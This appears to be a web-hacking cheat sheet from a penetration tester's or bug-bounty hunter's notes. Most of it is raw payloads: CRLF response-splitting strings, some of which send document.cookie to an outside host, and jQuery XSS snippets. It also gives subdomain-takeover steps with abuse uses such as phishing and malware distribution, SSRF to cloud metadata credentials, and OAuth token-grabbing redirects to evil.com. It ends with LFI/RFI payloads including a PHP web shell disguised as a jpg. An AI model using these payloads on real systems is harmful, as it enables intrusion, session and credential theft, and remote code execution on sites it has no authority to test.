22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dwindow.location(%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.html%22)%3B%3E%0a%3Cscript%3Elocation.href%3D'http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3F'%2Bdocument.cookie%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aLast-Modified%3A%20Fri%2C%2006%20Mar%202017%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0aContent-Length%3A%2040%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
//crowdshield.com%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%20222%0d%0a<script>alert%28%27INJECTX%27%29<%2fscript>%0d%0a%0d%0a
%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0dINJECTX%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d
%0a%0a%0a%0a%0a%0a%%0a%0a%0a%0a%0a%0aINJECTX%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a
%0a
%0d
%0d%0a
%0d%0a
%0d%0a
%0d%0a%20
%0d%0a%20
%0d%0a%20
https://crowdshield.com/%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Set-Coookie%3AINJECTX%3DINJECTX
%0d%0aContent-Length:%200%0d%0d%0a%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0d%0a%0a<html>Hacked</html>
%0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aContent-Type%3A%20text%2Fhtml%0d%0aLast-Modified%3A%20Fri%2C%2030%20Apr%202099%2011%3A11%3A18%20GMT%0d%0aContent-Length%3A%2048%0d%0a%3Chtml%3E%3Cscript%3Edocument.cookie()%3B%3C%2Fscript%3E%3C%2Fhtml%3E
%0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0d%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0d%0aContent-Length%3A%2040%0d%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
%0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0d%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0d%0aContent-Length%3A%2052%0d%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
%0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0d%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0d%0aContent-Length%3A%20769%0d%0a%3Chtml%3E%3Cbody%3E%3Cscript%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.js%3Fscript_src%3D1%22%3E%3C%2Fscript%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src%3D1%22%3E%3C%2Fimg%3E%0d%0a%3Ciframe%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%220%22%20width%3D%220%22%3E%3C%2Fiframe%3E%0d%0a%3Ciframe%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dprompt(%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.js%22)%3B%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dwindow.location(%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.html%22)%3B%3E%0d%0a%3Cscript%3Elocation.href%3D'http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3F'%2Bdocument.cookie%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
%0d%0aReferer:%20https://crowdshield.com/INJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
%0d%20
%0d%20
%0dContent-Length:%200%0d%0dHTTP/1.1%20200%20OK%0dContent-Type:%20text/html%0dContent-Length:%2019%0d%0d<html>Hacked</html>
200%20OK%0aCookie%3A%20%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%0aContent-Type%3A%20text%2Fhtml%0a%0a%3Chtml%3E%0a%3Cscript%3Ealert(2)%3B%3C%2Fscript%3E%0a%3C%2Fhtml%3E%3C!--%0a%0a
200%20OK%0d%0aCookie%3A%20%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%0d%0aContent-Type%3A%20text%2Fhtml%0d%0d%0a%0a%3Chtml%3E%0d%0a%3Cscript%3Ealert(2)%3B%3C%2Fscript%3E%0d%0a%3C%2Fhtml%3E%3C!--%0d%0d%0a%0a
%0aSet-Cookie:%20INJECTX=INJECTX;%0a
%20%0a
%20%0a
%20%0a%20
%20%0d
%20%0d
%20%0d%0a
%20%0d%0a
%20%0d%0a
%20%0d%0a%20
%20%0d%0a%20
%20%0d%0a%20
%20%0d%20
%20%0d%20
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Set-Cookie%3AINJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
%20%250a
%20%250a%250d
%250a
%250a%20
%250a%250d
%250a%250d%20
%25%30%41%a
%25%30%44%25%30%41%a
%25%30%44%a
%25%30%61%a
%25%30%64%a
%25%32%30%25%30%64%25%30%61%a
%2F%2crowdshield.com%0aContent-Type%3Atext%2Fhtml%0aContent-Length%0a222%0a%3Cscript%3Ealert('XSSPOSED')%3C%2Fscript%22%3E
%2F%2Fcrowdshield.com%0d%0aContent-Type%3Atext%2Fhtml%0d%0aContent-Length%0d%0a222%0d%0a%3Cscript%3Ealert('XSSPOSED')%3C%2Fscript%22%3E
%5c%72%5c%6e
%5C%72%5C%6E
%5cr%5cn
%5CR%5CN
INJECTX%0dXTest%3AINJECTX
INJECTX%250aXTest%3AINJECTX
%e5%98%8a
%e5%98%8A
%E5%98%8a
%E5%98%8A
en%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aContent-Length%3A%2048%0a%3Chtml%3E%3Cscript%3Edocument.cookie()%3B%3C%2Fscript%3E%3C%2Fhtml%3E
en%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLast-Modified%3A%20Fri%2C%2030%20Apr%202099%2011%3A11%3A18%20GMT%0aContent-Length%3A%2048%0a%3Chtml%3E%3Cscript%3Edocument.cookie()%3B%3C%2Fscript%3E%3C%2Fhtml%3E
en%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLocation%3A%20http%3A%2F%2Fcrowdshield.com%0aContent-Length%3A%20122%0a%3Chtml%3E%3CBODY%20ONLOAD%3Dalert('XSS')%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3CIFRAME%20SRC%3D%22javascript%3Aalert('XSS')%3B%22%3E%3C%2FIFRAME%3E%3C%2Fbody%3E%3C%2Fhtml%3E
en%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0aContent-Length%3A%2040%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
en%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aLast-Modified%3A%20Fri%2C%2006%20Mar%202017%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0aContent-Length%3A%2040%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
en%0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0d%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0d%0aContent-Length%3A%2040%0d%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
en%250AContent-Length%253A%25200%250A%250AHTTP%252F1.1%2520200%2520OK%250AContent-Type%253A%2520text%252Fhtml%250AContent-Length%253A%252048%250A%253Chtml%253E%253Cscript%253Edocument.cookie%28%29%253B%253C%252Fscript%253E%253C%252Fhtml%253E
foobar%0d%0aCONTENT-LENGTH:%200%0d%0d%0a%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aCONTENT-LENGTH:%2025%0d%0d%0a%0a<html>Hacked</html>
foobar%0dCONTENT-LENGTH:%200%0d%0dHTTP/1.1%20200%20OK%0dContent-Type:%20text/html%0dCONTENT-LENGTH:%2025%0d%0d<html>Hacked</html>
foobar%20%0d%0aContent-Length%3A%200%20%0d%0aHTTP%2F1.1%20200%20OK%20%0d%0aContent-Type%3A%20text%2Fhtml%20%0d%0aLast-Modified%3A%20Mon%2C%2027%20Oct%202016%2014%3A50%3A18%20GMT%20%0d%0aContent-Length%3A%2045%20%0d%0aHacked%0d%0a
foobar%20%0dContent-Length%3A%200%20%0dHTTP%2F1.1%20200%20OK%20%0dContent-Type%3A%20text%2Fhtml%20%0dLast-Modified%3A%20Mon%2C%2027%20Oct%202016%2014%3A50%3A18%20GMT%20%0dContent-Length%3A%2045%20%0dHacked%0d
###General Vectors###
HTTP/1.1+200+OK%0aContent-Type:+text/html%0aContent-Length:+132%0aContent-Encoding:+deflate%0a%0aD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAtwwwEt33sGDttwGDDDGG03sDGGwGGtDtt33333sG03333sDDdFPcOKwGWoSsgkwoemUcMOKwGWoS4
HTTP/1.1+200+OK%0d%0aContent-Type:+text/html%0d%0aContent-Length:+132%0d%0aContent-Encoding:+deflate%0d%0d%0a%0aD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAtwwwEt33sGDttwGDDDGG03sDGGwGGtDtt33333sG03333sDDdFPcOKwGWoSsgkwoemUcMOKwGWoS4
\nINJECTX
\nINJECTX\n\n
\n\nINJECTX
\n\rINJECTX
\n\rINJECTX\n\r
\n\rINJECTX\n\r\n\r
\r\n
%0dSet-Cookie: INJECTX=INJECTX
%0aSet-Cookie: INJECTX=INJECTX
%0d%0a%20Set-Cookie: INJECTX=INJECTX
%0aSet-Cookie: INJECTX=INJECTX%0aX:INJECTX
%0dSet-Cookie: INJECTX=INJECTX%0aX:INJECTX
%0d%0aSet-Cookie: INJECTX=x%0aX:INJECTX
%0d%0a%20Set-Cookie: x=x%0aX:INJECTX
%E5%98%8A%E5%98%8DSet-Cookie: INJECTX=INJECTX
//www.xerosecurity.com/%2E%2E%0aSet-Cookie: INJECTX=INJECTX
//www.xerosecurity.com/%2E%2E%0d%0a%20Set-Cookie: INJECTX=INJECTX
//www.xerosecurity.com/%2E%2E%0dSet-Cookie: INJECTX=INJECTX
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++set-Cookie: INJECTXXXXXXXXXX;
INJECTX%0aSet-Cookie%3AINJECT%3DINJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0aLocation%3Ahttp%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%0a%0a
INJECTX%0aSet-Cookie: INJECT=INJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
INJECTX%0d%0aSet-Cookie%3AINJECT%3DINJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0d%0aLocation%3Ahttp%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%0d%0d%0a%0a
INJECTX%0dXTest%3AINJECTX
%E5%98%8A%E5%98%8DSet-Cookie: %20INJECTX
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%29%E5%98%BE
/test/%2e%2e/tr
//////www.xerosecurity.com/%2e%2e/tr
%2fwww.xerosecurity.com%2f%2e%2e/tr
/%0aSet-Cookie: INJECTX%0aX:/%2e%2e/tr
%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(INJECTX)%3c/script%3e%2F..%2F..%2F..%2F../
<h1\>INJECTX</h1\>
foo%00%0d%0abar
foo%250d%250abar
foo%%0d0d%%0a0abar
%0dSet-Cookie: INJECTX=INJECTX
%0aSet-Cookie: INJECTX=INJECTX
%0d%0a%20Set-Cookie: INJECTX=INJECTX
%0aSet-Cookie: INJECTX=INJECTX%0aX:INJECTX
%0dSet-Cookie: INJECTX=INJECTX%0aX:INJECTX
%0d%0aSet-Cookie: INJECTX=x%0aX:INJECTX
%0d%0a%20Set-Cookie: x=x%0aX:INJECTX
%E5%98%8A%E5%98%8DSet-Cookie: INJECTX=INJECTX
//www.xerosecurity.com/%2E%2E%0aSet-Cookie: x=INJECTX
//www.xerosecurity.com/%2E%2E%0d%0a%20Set-Cookie: x=INJECTX
//www.xerosecurity.com/%2E%2E%0dSet-Cookie: x=INJECTX
INJECTX'"<>/%2e%2e
INJECTX'"<>/%2e%2e/
INJECTX'"<>
INJECTX%27%22%3c%3e%2e%2e
INJECTX%27%22%3c%3e%2e%2e/
INJECTX/%2e%2e
INJECTX/%2e%2e/
%2e%2e/INJECTX/
%2e%2e/INJECTX
-----------

-----------Cropping images RCE
# check this post https://hackerone.com/reports/212696
-----------

-----------Jquery vulnerabilities
# http://research.insecurelabs.org/jquery/test/
--Bug 9521
# http://jsfiddle.net/UyuBx/
$('#<img src="nosuch.jpg" onerror="alert(\'owned\')">').appendTo("body");

--Bug 11290
# http://jsfiddle.net/C8dgG/300/
$.get('http://sakurity.com/jqueryxss')

--Issue 2432
# http://jsfiddle.net/C8dgG/27/
$("element[attribute='<script>alert(1);</script><img src='sss' onerror='alert(1)'><b>zzz</b>']")
-----------

-----------Apache Struts RCE - CVE-2017-5638
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Shellshock%20Heartbleed%20Struts2/Apache%20Struts2.py
-----------

-----------Subdomain takeover
# https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/
# https://blog.sweepatic.com/subdomain-takeover-principles/
nslookup xxxx.yyyy.com 8.8.8.8					--> check it
# They usually (can) point to a CNAME (canonical name) to another domain that it's still not taken.
# It it's an orphan CloudFront for exmample, we can create a new one with the CNAME of the domain
# https://hackerone.com/reports/219205
# https://blog.zsec.uk/subdomainhijack/
# https://medium.com/bugbountywriteup/how-i-started-a-chain-of-subdomain-takeovers-and-hacked-100s-of-companies-770d8f84885e		--> list of a lot of vulnerable services
-----------

-----------Subdomain takeover - automatic tool Subover
# https://github.com/Ice3man543/SubOver
-----------

-----------Subdomain Takeover attack vectors
- SOP profit (subdomains' cookies, etc..)
- CORS profit
- Trusted landing phishing url (gather credentials)
- Phishing sending mails from the real subdomain (register the domain in G-Suite and validate it via html upload or meta-tag)
- Deface
- Malware distribution
- Steal tokens (permissive oauth)
-----------

-----------Subdomain Takeover list
# https://github.com/EdOverflow/can-i-take-over-xyz
AWS/S3					Yes		The specified bucket does not exist	
Bitbucket				Yes		Repository not found	
Campaign Monitor		Yes		Support Page
Cargo Collective		Yes		404 Not Found	Cargo Support Page
Cloudfront				Yes		Bad Request: ERROR: The request could not be satisfied	--> https://blog.zsec.uk/subdomainhijack/
Desk					Yes		Sorry, We Couldn't Find That Page	
Fastly					Yes		Fastly error: unknown domain:	
Feedpress				Yes		The feed has not been found.	--> https://hackerone.com/reports/195350
Freshdesk				No		Freshdesk Support Page
Ghost					Yes		The thing you were looking for is no longer here, or never was	
Github					Yes		There isn't a Github Pages site here.	-->https://hackerone.com/reports/263902
Gitlab					No						--> https://hackerone.com/reports/312118
Google Cloud Storage	No		
Help Juice				Yes		We could not find what you're looking for.	Help Juice Support Page
Help Scout				Yes		No settings were found for this company:	HelpScout Docs
Heroku					Yes		No such app	
JetBrains				Yes		is not a registered InCloud YouTrack	
Mashery					No		Unrecognized domain		--> https://hackerone.com/reports/275714
Microsoft Azure			Yes		
Sendgrid				No		
Shopify					Yes		Sorry, this shop is currently unavailable.	
Squarespace				No		
Statuspage				Yes		You are being redirected		--> https://hackerone.com/reports/49663
Surge.sh				Yes		project not found		--> https://surge.sh/help/adding-a-custom-domain
Tumblr					Yes		Whatever you were looking for doesn't currently exist at this address	
Tilda					No		Please renew your subscription	
Unbounce				Yes		The requested URL was not found on this server.		--> https://hackerone.com/reports/202767
UserVoice				Yes		This UserVoice subdomain is currently available!	
Wordpress				Yes		Do you want to register *.wordpress.com?	
WP Engine				No		
Zendesk					Yes		Help Center Closed			--> XSS https://support.zendesk.com/hc/en-us/articles/203664326-Customizing-your-Help-Center-theme-Guide-Professional-and-Enterprise-
-----------

-----------Look for subdomains tools
# Sublist3r:
git clone https://github.com/aboul3la/Sublist3r.git
# Subbrute:
git clone https://github.com/TheRook/subbrute
# Ctfr:
git clone https://github.com/UnaPibaGeek/ctfr.git
-----------

-----------AWS S3 Buckets permissions/vulnerabilities
# https://labs.detectify.com/2017/07/13/a-deep-dive-into-aws-s3-access-controls-taking-full-control-over-your-assets/
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3
# Configure AWS client:
sudo apt install awscli
aws configure --profile nameofprofile					--> Create a user in the AWS Identity Access Manager (IAM)
	aws configure
	AWSAccessKeyId=[ENTER HERE YOUR KEY]
	AWSSecretKey=[ENTER HERE YOUR KEY]
# S3 commands (list, move, copy)
aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
aws s3 mv test.txt s3://flaws.cloud/
aws s3 cp test.txt s3://flaws.cloud/
# Bucket information (AWS exposes an internal service every EC2 instance)
http://169.254.169.254/latest/meta-data/
# So, if you found an SSRF you cound do:
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/X.X.X.X/latest/meta-data/iam/security-credentials/flaws/
-----------

-----------AWS S3 bucket scanner
# https://github.com/ankane/s3tk
pip install s3tk
pip install awscli
aws configure
s3tk scan XXXXX
-----------

-----------Subdomain takeover + improper oauth checks
# https://www.safetydetective.com/blog/microsoft-outlook/
-----------

-----------Bypassing upload policy in AWS S3 buckets
# https://labs.detectify.com/2018/08/02/bypassing-exploiting-bucket-upload-policies-signed-urls/
-----------

-----------OAuth2 vulnerabilities
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth
# http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html
# http://blog.intothesymmetry.com/2015/06/on-oauth-token-hijacks-for-fun-and.html
# Redirect to a controlled domain to get the access token (Grabbing OAuth Token via redirect_uri)
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
# Redirect to an accepted Open URL in to get the access token (Grabbing OAuth Token via redirect_uri)
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
# Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri: (Grabbing OAuth Token via redirect_uri)
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
# Executing XSS via redirect_uri
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
# OAuth private key disclosure
Some Android/iOS app can be decompiled and the OAuth Private key can be accessed.
-----------

-----------Local/Remote File Inclusion - LFI - RFI
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20include
# https://github.com/spamv/IntruderPayloads/blob/master/FuzzLists/lfi.txt
# Basic LFI (null byte, double encoding and other tricks)
http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
# LFI Wrapper rot13 and base64 - php://filter case insensitive
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
# LFI Wrapper ZIP
os.system("echo \"</pre><?php system($_GET['cmd']); ?></pre>\" > payload.php; zip payload.zip payload.php; mv payload.zip shell.jpg; rm payload.php")
http://example.com/index.php?page=zip://shell.jpg%23payload.php
# RFI Wrapper DATA with "" payload
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4
# RFI Wrapper EXPECT
http://example.com/index.php?page=php:expect://id
http://example.com/index.php?page=php:expect://ls
# XSS via RFI/LFI with "<<svg<>svg onload=alert(1)>" payload
